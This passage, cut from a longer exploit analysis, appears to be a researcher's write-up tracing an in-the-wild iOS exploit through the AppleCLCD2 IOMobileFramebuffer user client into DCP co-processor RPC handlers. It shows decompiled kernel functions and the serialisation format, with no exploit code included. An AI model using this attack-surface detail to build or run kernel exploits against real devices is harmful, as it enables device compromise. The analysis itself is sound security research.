 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">void</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c0">__cdecl </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">take_global_type_ref</span><span class="HovzfPYjjR-c1">)(</span><span class="HovzfPYjjR-c0">RTKIT_RC_RTTI_BASE </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c9">this</span><span class="HovzfPYjjR-c1">);</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">void</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c0">__cdecl </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">drop_global_type_ref</span><span class="HovzfPYjjR-c1">)(</span><span class="HovzfPYjjR-c0">RTKIT_RC_RTTI_BASE </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c9">this</span><span class="HovzfPYjjR-c1">);</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">void</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c0">__cdecl </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">getClassName</span><span class="HovzfPYjjR-c1">)(</span><span class="HovzfPYjjR-c0">RTKIT_RC_RTTI_BASE </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c9">this</span><span class="HovzfPYjjR-c1">);</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">void</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c0">__cdecl </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">dtor_a</span><span class="HovzfPYjjR-c1">)(</span><span class="HovzfPYjjR-c0">RTKIT_RC_RTTI_BASE </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c9">this</span><span class="HovzfPYjjR-c1">);</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">void</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c0">__cdecl </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">unk</span><span class="HovzfPYjjR-c1">)(</span><span class="HovzfPYjjR-c0">RTKIT_RC_RTTI_BASE </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c9">this</span><span class="HovzfPYjjR-c1">);</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">};</span></p></td></tr></table><h2 class="HovzfPYjjR-c15 HovzfPYjjR-c8" id="h.17hwrgmah5ee"><span class="HovzfPYjjR-c16 HovzfPYjjR-c2">Exploit flow</span></h2>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>The exploit running in the app starts by opening an IOKit user client for the </span><span class="HovzfPYjjR-c7">AppleCLCD2</span><span>&nbsp;service. </span><span class="HovzfPYjjR-c7">AppleCLCD</span><span>&nbsp;seems to be the application processor of </span><span class="HovzfPYjjR-c7">IOMobileFrameBuffer</span><span>&nbsp;and </span><span class="HovzfPYjjR-c7">AppleCLCD2</span><span>&nbsp;the </span><span class="HovzfPYjjR-c7">DCP</span><span>&nbsp;version.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>The exploit only calls 3 different external method selectors on the </span><span class="HovzfPYjjR-c7">AppleCLCD2</span><span>&nbsp;user client: </span><span class="HovzfPYjjR-c7">68</span><span>, </span><span class="HovzfPYjjR-c7">78</span><span>&nbsp;and </span><span class="HovzfPYjjR-c7">79</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">The one with the largest and most interesting-looking input is 78, which corresponds to this user client method in the kernel driver:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.c1d0de88bea2ae99b6a4f974f60cac134013db41"></a><a id="t.3"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c14">IOReturn</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c14">IOMobileFramebufferUserClient</span><span class="HovzfPYjjR-c1">::</span><span class="HovzfPYjjR-c0">s_set_block</span><span class="HovzfPYjjR-c1">(</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c14">IOMobileFramebufferUserClient</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c9">this</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">void</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">reference</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c14">IOExternalMethodArguments</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">args</span><span class="HovzfPYjjR-c1">)</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">{</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">const</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">unsigned</span><span class="HovzfPYjjR-c0">&nbsp;__int64 </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">extra_args</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; u8 </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">structureInput</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c10"><span class="HovzfPYjjR-c0 HovzfPYjjR-c2"></span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; structureInput </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;args</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">structureInput</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">if</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c0">&nbsp;structureInput </span><span class="HovzfPYjjR-c1">&amp;&amp;</span><span class="HovzfPYjjR-c0">&nbsp;args</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">scalarInputCount </span><span class="HovzfPYjjR-c1">&gt;=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">2</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">)</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c1">{</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">if</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c0">&nbsp;args</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">scalarInputCount </span><span class="HovzfPYjjR-c1">==</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">2</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">)</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; extra_args </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">0LL</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">else</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; extra_args </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;args</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">scalarInput </span><span class="HovzfPYjjR-c1">+</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">2</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c10"><span class="HovzfPYjjR-c0 HovzfPYjjR-c2"></span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">return</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">this</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">framebuffer_ap</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">set_block_dcp</span><span class="HovzfPYjjR-c1">(</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="HovzfPYjjR-c9">this</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">task</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;args</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">scalarInput</span><span class="HovzfPYjjR-c1">[</span><span class="HovzfPYjjR-c4">0</span><span class="HovzfPYjjR-c1">],</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;args</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">scalarInput</span><span class="HovzfPYjjR-c1">[</span><span class="HovzfPYjjR-c4">1</span><span class="HovzfPYjjR-c1">],</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;extra_args</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;args</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">scalarInputCount </span><span class="HovzfPYjjR-c1">-</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">2</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;structureInput</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;args</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">structureInputSize</span><span class="HovzfPYjjR-c1">);</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c1">}</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">else</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">{</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">return</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">0xE00002C2</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c1">}</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">}</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>this unpacks the </span><span class="HovzfPYjjR-c7">IOConnectCallMethod</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;arguments and passes them to:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.4b4f98b94b8ed8638b5222e4f9d81049bbe69fdb"></a><a id="t.4"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c14">IOMobileFramebufferAP</span><span class="HovzfPYjjR-c1">::</span><span class="HovzfPYjjR-c0">set_block_dcp</span><span class="HovzfPYjjR-c1">(</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c14">IOMobileFramebufferAP</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c9">this</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; task </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">task</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">int</span><span class="HovzfPYjjR-c0">&nbsp;first_scalar_input</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">int</span><span class="HovzfPYjjR-c0">&nbsp;second_scalar_input</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">const</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">unsigned</span><span class="HovzfPYjjR-c0">&nbsp;__int64 </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">pointer_to_remaining_scalar_inputs</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">unsigned</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">int</span><span class="HovzfPYjjR-c0">&nbsp;scalar_input_count_minus_2</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">const</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">unsigned</span><span class="HovzfPYjjR-c0">&nbsp;__int8 </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">struct_input</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">unsigned</span><span class="HovzfPYjjR-c0">&nbsp;__int64 struct_input_size</span><span class="HovzfPYjjR-c1">)</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">This method uses some autogenerated code to serialise the external method arguments into a buffer like this: </span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.26b4f1ef327e79bf7a370b395d86bddb90eb464f"></a><a id="t.5"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">arg_struct</span><span class="HovzfPYjjR-c1">:</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">{</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;task</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0 HovzfPYjjR-c2">&nbsp;task</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0 HovzfPYjjR-c2">&nbsp; u64 scalar_input_0</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0 HovzfPYjjR-c2">&nbsp; u64 scalar_input_1</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; u64</span><span class="HovzfPYjjR-c1">[]</span><span class="HovzfPYjjR-c0 HovzfPYjjR-c2">&nbsp;remaining_scalar_inputs</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0 HovzfPYjjR-c2">&nbsp; u64 cntExtraScalars</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; u8</span><span class="HovzfPYjjR-c1">[]</span><span class="HovzfPYjjR-c0 HovzfPYjjR-c2">&nbsp;structInput</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; u64 </span><span class="HovzfPYjjR-c14">CntStructInput</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">}</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>which is then passed to </span><span class="HovzfPYjjR-c7">UnifiedPipeline2::rpc</span><span>&nbsp;along with a 4-byte ASCII method identifier ('</span><span class="HovzfPYjjR-c7">A435</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">' here):</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.afc7096b3986ce85a82073984786eb19b4fcdb59"></a><a id="t.6"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c14">UnifiedPipeline2</span><span class="HovzfPYjjR-c1">::</span><span class="HovzfPYjjR-c0">rpc</span><span class="HovzfPYjjR-c1">(</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c22">'A435'</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; arg_struct</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c4">0x105Cu</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c1">&amp;</span><span class="HovzfPYjjR-c0">retval_buf</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c4">4u</span><span class="HovzfPYjjR-c1">);</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c7">UnifiedPipeline2::rpc</span><span>&nbsp;calls </span><span class="HovzfPYjjR-c7">DCPLink::rpc</span><span>&nbsp;which calls </span><span class="HovzfPYjjR-c7">AppleDCPLinkService::rpc</span><span>&nbsp;to perform one more level of serialisation which packs the method identifier and a "stream identifier" together with the </span><span class="HovzfPYjjR-c7">arg_struct</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;shown above.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c7">AppleDCPLinkService::rpc</span><span>&nbsp;then calls </span><span class="HovzfPYjjR-c7">rpc_caller_gated</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;to allocate space in a shared memory buffer, copy the buffer into there then signal to the DCP that a message is available.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>Effectively the implementation of the </span><span class="HovzfPYjjR-c7">IOMobileFramebuffer</span><span>&nbsp;user client has been moved on to the DCP and the external method interface is now a proxy shim, via shared memory, to the actual implementations of the external methods which </span><span>run on the DCP.</span></p><h2 class="HovzfPYjjR-c15 HovzfPYjjR-c8" id="h.5nfahlo9nbh6"><span class="HovzfPYjjR-c16 HovzfPYjjR-c2">Exploit flow: the other side</span></h2>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>The next challenge is to find where the messages start being processed on the DCP. Looking through the log strings there's a function which is clearly called </span><span class="HovzfPYjjR-c7">rpc_calle</span><span class="HovzfPYjjR-c26">e</span><span class="HovzfPYjjR-c7">_gated</span><span>&nbsp;- quite likely that's the receive side of the function </span><span class="HovzfPYjjR-c7">rpc_calle</span><span class="HovzfPYjjR-c26">r</span><span class="HovzfPYjjR-c7">_gated</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;we saw earlier.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c7">rpc_callee_gated</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;unpacks the wire format then has an enormous switch statement which maps all the 4-letter RPC codes to function pointers:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.47d68344bf5cd802c2cfc796e38eefd94678d525"></a><a id="t.7"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">switch</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c0">&nbsp;rpc_id </span><span class="HovzfPYjjR-c1">)</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c1">{</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">case</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c22">'A000'</span><span class="HovzfPYjjR-c1">:</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">goto</span><span class="HovzfPYjjR-c0">&nbsp;LABEL_146</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">case</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c22">'A001'</span><span class="HovzfPYjjR-c1">:</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; handler_fptr </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;callback_handler_A001</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">break</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">case</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c22">'A002'</span><span class="HovzfPYjjR-c1">:</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; handler_fptr </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;callback_handler_A002</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">break</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">case</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c22">'A003'</span><span class="HovzfPYjjR-c1">:</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; handler_fptr </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;callback_handler_A003</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">break</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">case</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c22">'A004'</span><span class="HovzfPYjjR-c1">:</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; handler_fptr </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;callback_handler_A004</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">break</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">case</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c22">'A005'</span><span class="HovzfPYjjR-c1">:</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; handler_fptr </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;callback_handler_A005</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">break</span><span class="HovzfPYjjR-c1">;</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
